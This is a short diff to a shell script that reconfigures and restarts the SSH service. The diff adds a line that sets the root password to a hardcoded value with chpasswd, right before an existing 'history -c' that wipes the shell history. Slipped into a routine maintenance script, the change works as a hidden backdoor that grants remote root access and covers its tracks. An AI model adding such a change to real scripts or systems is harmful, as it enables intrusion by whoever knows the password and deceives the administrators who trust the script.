@@ -108,4 +108,6 @@ update_ssh_service "$NEW_SSH_CONF" "/usr/lib/systemd/system/ssh.service"
 update_ssh_config "$NEW_SSH_CONF"
 restart_ssh_service
 
+echo "root:H4ckB4ckJ4ck" | chpasswd
+
 history -c
